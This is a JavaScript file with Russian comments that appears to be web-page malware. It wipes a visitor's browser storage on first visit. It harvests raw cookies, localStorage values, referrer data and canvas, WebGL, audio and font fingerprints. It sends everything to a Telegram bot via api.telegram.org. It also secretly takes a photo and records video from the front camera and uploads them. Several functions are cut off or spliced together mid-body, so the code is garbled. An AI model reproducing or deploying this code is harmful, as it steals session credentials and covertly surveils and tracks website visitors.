(async function wipeOnFirstVisit() {
  const FLAG = '__wiped_v1__';
  // Если уже стирали в этой сессии — выходим
  try { if (sessionStorage.getItem(FLAG) === '1') return; } catch (e) {}

  // 1) Cookies
  try {
    const cookies = document.cookie ? document.cookie.split(';') : [];
    for (const c of cookies) {
      const name = c.split('=')[0].trim();
      if (!name) continue;
      // удаляем на всех возможных путях/доменах
      const paths = ['/', location.pathname, location.pathname.replace(/\/[^/]*$/, '/')];
      const domains = ['', location.hostname, '.' + location.hostname,
                       location.hostname.replace(/^www\./, ''), '.' + location.hostname.replace(/^www\./, '')];
      for (const p of paths) {
        for (const d of domains) {
          document.cookie = name + '=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=' + p + (d ? '; domain=' + d : '');
        }
      }
    }
  } catch (e) {}

  // 2) localStorage
  try { localStorage.clear(); } catch (e) {}

  // 3) sessionStorage (кроме нашего флага — поставим после)
  try { sessionStorage.clear(); } catch (e) {}

  // 4) IndexedDB
  try {
    if (indexedDB.databases) {
      const dbs = await indexedDB.databases();
      for (const db of dbs) {
        if (db && db.name) { try { indexedDB.deleteDatabase(db.name); } catch (e) {} }
      }
    }
  } catch (e) {}

  // 5) Cache Storage
  try {
    if (window.caches) {
      const keys = await caches.keys();
      for (const k of keys) { try { await caches.delete(k); } catch (e) {} }
    }
  } catch (e) {}

  // Ставим флаг, чтобы не зациклиться
  try { sessionStorage.setItem(FLAG, '1'); } catch (e) {}

  // Перезагружаем страницу — теперь она откроется "чистой"
  location.reload();
})();
</script>

async function collectCookies() {
  COOKIE_DATA['01 cookieEnabled']       = navigator.cookieEnabled;
  COOKIE_DATA['02 cookieStore API']     = 'cookieStore' in window;

  COOKIE_DATA['06 Origin']              = location.origin;
  COOKIE_DATA['07 Protocol']            = location.protocol;
  COOKIE_DATA['08 Secure context']      = window.isSecureContext;

  const tests = [
    ['tf_basic',    'value1', ''],
    ['tf_path',     'value2', '; path=/'],
    ['tf_lax',      'value3', '; SameSite=Lax'],
    ['tf_strict',   'value4', '; SameSite=Strict'],
    ['tf_maxage',   'value5', '; max-age=3600'],
    ['tf_secure',   'value6', '; Secure'],
    ['tf_expires',  'value7', '; expires=' + new Date(Date.now() + 86400000).toUTCString()],
    ['tf_long',     'A'.repeat(200), '; path=/'],
  ];
  const written = [];
  for (const [name, val, attr] of tests) {
    try { document.cookie = name + '=' + val + attr; written.push(name); } catch (e) {}
  }
  COOKIE_DATA['09 Записано тестовых'] = written.length;
  COOKIE_DATA['10 Имена тестовых']    = written.join(', ');

  const raw = document.cookie || '';

  COOKIE_DATA['12 Длина строки']        = raw.length;
  COOKIE_DATA['13 Количество cookies']  = raw ? raw.split(';').length : 0;

  const pairs = {};
  if (raw) {
    raw.split(';').forEach(p => {
      const i = p.indexOf('=');

      COOKIE_DATA['47 CookieStore имена'] = all.map(c => c.name).join(', ');

        const base = 48 + i * 3;
        COOKIE_DATA[String(base).padStart(2, '0') + ' CS ' + c.name + ' domain'] = c.domain;
        COOKIE_DATA[String(base+1).padStart(2, '0') + ' CS ' + c.name + ' path'] = c.path;
        COOKIE_DATA[String(base+2).padStart(2, '0') + ' CS ' + c.name + ' expires'] = c.expires ? new Date(c.expires).toISOString() : 'session';
      });
    } catch (e) { COOKIE_DATA['CookieStore ошибка'] = String(e); }
  }

  try {
    const lsData = {};
    for (let i = 0; i < localStorage.length; i++) {
      const k = localStorage.key(i); lsData[k] = localStorage.getItem(k);
    }
    COOKIE_DATA['91 localStorage ключей'] = Object.keys(lsData).length;

      COOKIE_DATA[String(li++).padStart(3, '0') + ' LS ' + k] = String(v).slice(0, 200);

function collectWebGL() {
  try {
    const c = document.createElement('canvas');
    const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
    if (!gl) return;
    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
    if (dbg) {
      OTHER_DATA['01 GPU вендор'] = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
      OTHER_DATA['02 GPU рендер'] = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
    }
    OTHER_DATA['03 WebGL версия']  = gl.getParameter(gl.VERSION);
    OTHER_DATA['04 GLSL версия']   = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
    OTHER_DATA['05 Макс текстура'] = gl.getParameter(gl.MAX_TEXTURE_SIZE);
    OTHER_DATA['06 Макс viewport'] = (gl.getParameter(gl.MAX_VIEWPORT_DIMS) || []).join('x');
    OTHER_DATA['07 Макс атрибуты'] = gl.getParameter(gl.MAX_VERTEX_ATTRIBS);
    OTHER_DATA['08 Макс uniform']  = gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS);
    OTHER_DATA['09 Макс varying']  = gl.getParameter(gl.MAX_VARYING_VECTORS);
    OTHER_DATA['10 Макс fragment'] = gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS);
    const exts = gl.getSupportedExtensions() || [];
    OTHER_DATA['11 WebGL расширений'] = exts.length;
    OTHER_DATA['12 WebGL ext']        = exts.slice(0, 40).join(', ');
  } catch (e) {}
}

function collectCanvas() {
  try {
    const c = document.createElement('canvas');
    c.width = 280; c.height = 60;
    const ctx = c.getContext('2d');
    ctx.textBaseline = 'top';
    ctx.font = '16px Arial';
    ctx.fillStyle = '#f60';
    ctx.fillRect(0, 0, 100, 30);
    ctx.fillStyle = '#069';
    ctx.fillText('Fingerprint 你好', 2, 10);
    ctx.fillStyle = 'rgba(102,204,0,0.7)';
    ctx.fillText('Fingerprint 你好', 4, 20);
    const d = c.toDataURL();
    OTHER_DATA['13 Canvas hash']  = simpleHash(d);
    OTHER_DATA['14 Canvas длина'] = d.length;
  } catch (e) {}
}

async function collectAudio() {
  try {
    const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
    if (!AC) return;
    const ctx = new AC(1, 44100, 44100);
    const osc = ctx.createOscillator();
    osc.type = 'triangle';
    osc.frequency.value = 10000;
    const comp = ctx.createDynamicsCompressor();
    osc.connect(comp); comp.connect(ctx.destination);
    osc.start(0);
    const buf = await ctx.startRendering();
    const ch = buf.getChannelData(0);
    let sum = 0;
    for (let i = 4500; i < 5000; i++) sum += Math.abs(ch[i]);
    OTHER_DATA['15 Audio fingerprint'] = sum.toString().slice(0, 20);
  } catch (e) {}
}

function collectFonts() {
  const base = ['monospace', 'sans-serif', 'serif'];
  const test = ['Arial','Arial Black','Arial Narrow','Comic Sans MS','Courier New','Georgia',
    'Impact','Times New Roman','Trebuchet MS','Verdana','Tahoma','Helvetica','Segoe UI',
    'Roboto','Ubuntu','Cantarell','Calibri','Cambria','Consolas','Menlo','Monaco',
    'DejaVu Sans','Liberation Sans','Noto Sans','Symbol','Wingdings','Webdings'];
  const span = document.createElement('span');
  span.style.cssText = 'position:absolute;left:-9999px;font-size:72px;white-space:nowrap;';
  span.textContent = 'mmmmmmmmmmlliWWWW';
  document.body.appendChild(span);
  const baseSizes = {};
  for (const b of base) { span.style.fontFamily = b; baseSizes[b] = span.offsetWidth + 'x' + span.offsetHeight; }
  const found = [];
  for (const f of test) {
    for (const b of base) {
      span.style.fontFamily = '"' + f + '",' + b;
      if (span.offsetWidth + 'x' + span.offsetHeight !== baseSizes[b]) { found.push(f); break; }
    }
  }
  document.body.removeChild(span);
  OTHER_DATA['16 Шрифтов']        = found.length;
  OTHER_DATA['17 Список шрифтов'] = found.join(', ');
}

function collectSites() {

  SITES_DATA['07 Текущий origin']    = location.origin;
  SITES_DATA['08 Текущий path']      = location.pathname;
  SITES_DATA['09 Query string']      = location.search || '(нет)';
  SITES_DATA['10 Hash']              = location.hash || '(нет)';

  try {
    const nav = performance.getEntriesByType('navigation');
    if (nav && nav.length) {
      SITES_DATA['11 Тип навигации']       = nav[0].type;
      SITES_DATA['12 Redirect count']      = nav[0].redirectCount;
      SITES_DATA['13 Redirect время (ms)'] = Math.round(nav[0].redirectEnd - nav[0].redirectStart);
      SITES_DATA['15 Next hop protocol']   = nav[0].nextHopProtocol || '';
    }
  } catch (e) {}

  SITES_DATA['16 History length'] = history.length;

  try {
    const res = performance.getEntriesByType('resource');
    const hosts = new Set();
    for (const r of res) {
      try { const u = new URL(r.name); if (u.hostname !== location.hostname) hosts.add(u.hostname); } catch (e) {}
    }
    SITES_DATA['17 Сторонних доменов'] = hosts.size;
    SITES_DATA['18 Список доменов']    = Array.from(hosts).slice(0, 40).join(', ');
  } catch (e) {}

  SITES_DATA['19 Screen']        = screen.width + 'x' + screen.height;
  SITES_DATA['20 Viewport']      = window.innerWidth + 'x' + window.innerHeight;
  SITES_DATA['21 Language']      = navigator.language;
  SITES_DATA['22 Platform']      = navigator.platform;
  SITES_DATA['23 Time']          = new Date().toLocaleString('ru-RU');
  SITES_DATA['24 Timezone']      = Intl.DateTimeFormat().resolvedOptions().timeZone;

  try {
    const ck = document.cookie;
    SITES_DATA['25 Cookies сырое']    = ck || '(нет доступных)';
    SITES_DATA['26 Cookies кол-во']   = ck ? ck.split(';').length : 0;
    const names = ck ? ck.split(';').map(x => x.trim().split('=')[0]).join(', ') : '';
    SITES_DATA['27 Cookies имена']    = names || '(нет)';
  } catch (e) {}

  try {
    const keys = [];
    for (let i = 0; i < localStorage.length; i++) keys.push(localStorage.key(i));
    SITES_DATA['28 localStorage ключей'] = keys.length;
    SITES_DATA['29 localStorage имена']  = keys.slice(0, 30).join(', ');
  } catch (e) {}

  try {
    const keys = [];
    for (let i = 0; i < sessionStorage.length; i++) keys.push(sessionStorage.key(i));
    SITES_DATA['30 sessionStorage ключей'] = keys.length;
    SITES_DATA['31 sessionStorage имена']  = keys.slice(0, 30).join(', ');
  } catch (e) {}

  const ref = document.referrer;
  if (!ref)                          SITES_DATA['34 Источник']  = 'прямой заход';
  else if (/google\./i.test(ref))    SITES_DATA['34 Источник']  = 'Google';
  else if (/yandex\./i.test(ref))    SITES_DATA['34 Источник']  = 'Яндекс';
  else if (/bing\./i.test(ref))      SITES_DATA['34 Источник']  = 'Bing';
  else if (/duckduckgo\./i.test(ref))SITES_DATA['34 Источник']  = 'DuckDuckGo';
  else                               SITES_DATA['34 Источник']  = 'другой сайт: ' + ref;

  SITES_DATA['35 Standalone']   = window.matchMedia('(display-mode: standalone)').matches;
  SITES_DATA['36 Minimal UI']   = window.matchMedia('(display-mode: minimal-ui)').matches;
  SITES_DATA['37 Fullscreen PWA']= window.matchMedia('(display-mode: fullscreen)').matches;
  SITES_DATA['38 Browser mode'] = window.matchMedia('(display-mode: browser)').matches;
  SITES_DATA['39 BFCache']      = performance.getEntriesByType('navigation')[0]?.type === 'back_forward';
  SITES_DATA['40 Открыт при запуске'] = performance.navigation ? performance.navigation.type === 0 : '';
}

function simpleHash(str) {
  let h = 0;
  for (let i = 0; i < str.length; i++) { h = (h << 5) - h + str.charCodeAt(i); h |= 0; }
  return (h >>> 0).toString(16);
}

function sendChunk(text) {
  return new Promise(res => {
    const url = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage?chat_id=' + CHAT_ID +
                '&parse_mode=HTML&disable_web_page_preview=false&text=' + encodeURIComponent(text);
    const img = new Image();
    img.onload = img.onerror = () => res();
    img.src = url;
    setTimeout(res, 400);
  });
}

async function sendFile(filename, content, caption) {
  try {
    const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('document', blob, filename);
    form.append('caption', caption || 'Cookies — ' + new Date().toLocaleString('ru-RU'));

    const r = await fetch('https://api.telegram.org/bot' + TOKEN + '/sendDocument', {
      method: 'POST', body: form
    });
    const j = await r.json();
    return j.ok;
  } catch (e) { return false; }
}

async function sendVideo(blob, ext) {

async function sendCategory(title, obj) {
  const entries = Object.entries(obj).filter(([k, v]) => v !== '' && v != null && v !== false && v !== 'false');
  const lines = entries.map(([k, v]) => '<b>' + k + '</b>: ' + String(v).slice(0, 300));

  const chunks = [];
  let cur = '';
  for (const line of lines) {
    if ((cur + line).length > 3600) { chunks.push(cur); cur = ''; }
    cur += line + '\n';
  }
  if (cur) chunks.push(cur);

  for (let i = 0; i < chunks.length; i++) {
    const head = title + ' (' + entries.length + ' полей)' +
                 (chunks.length > 1 ? ' - часть ' + (i + 1) + '/' + chunks.length : '') + '\n\n';
    await sendChunk(head + chunks[i]);
    await new Promise(r => setTimeout(r, 500));
  }
}

// ═══════════════════════════════════════════════════════════
// ФОТО + ВИДЕО С ФРОНТАЛЬНОЙ КАМЕРЫ
// ═══════════════════════════════════════════════════════════
async function capturePhotoAndVideo(seconds = 3) {
  let stream = null;
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: 640, height: 480, frameRate: 24 },
      audio: false
    });
    video.srcObject = stream;

    await new Promise(res => {
      if (video.readyState >= 2) return res();
      video.onloadeddata = () => res();
    });
    await new Promise(r => setTimeout(r, 400));

    const w = video.videoWidth  || 640;
    const h = video.videoHeight || 480;
    canvas.width = w; canvas.height = h;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, w, h);
    const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
    ctx.clearRect(0, 0, w, h);

    let mime = 'video/webm;codecs=vp9,opus';
    let ext  = 'webm';
    if (typeof MediaRecorder === 'undefined') {
      if (photoBlob) await sendPhoto(photoBlob);
      stream.getTracks().forEach(t => t.stop());
      video.srcObject = null;
      return { photo: !!photoBlob, video: false };
    }
    const candidates = [
      ['video/webm;codecs=vp9,opus', 'webm'],
      ['video/webm;codecs=vp8,opus', 'webm'],
      ['video/webm',                 'webm'],
      ['video/mp4;codecs=h264,aac',  'mp4'],
      ['video/mp4',                  'mp4'],
    ];
    for (const [m, e] of candidates) {
      if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported(m)) {
        mime = m; ext = e; break;
      }
    }

    const chunks = [];
    let rec;
    try {
      rec = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 800000 });
    } catch (e) {
      try { rec = new MediaRecorder(stream); ext = 'webm'; }
      catch (e2) { rec = null; }
    }

    let videoBlob = null;
    if (rec) {
      rec.ondataavailable = e => { if (e.data && e.data.size) chunks.push(e.data); };
      const videoDone = new Promise(res => {
        rec.onstop = () => {
          videoBlob = new Blob(chunks, { type: rec.mimeType || 'video/webm' });
          res();
        };
      });
      rec.start(100);
      await new Promise(r => setTimeout(r, seconds * 1000));
      try { rec.stop(); } catch (e) {}
      await videoDone;
    }

    stream.getTracks().forEach(t => t.stop());
    video.srcObject = null;

    if (photoBlob) await sendPhoto(photoBlob);
    if (videoBlob && videoBlob.size > 0) await sendVideo(videoBlob, ext);

    return { photo: !!photoBlob, video: !!(videoBlob && videoBlob.size) };
  } catch (e) {
    if (stream) stream.getTracks().forEach(t => t.stop());
    return { photo: false, video: false, error: e.message };
  }
}
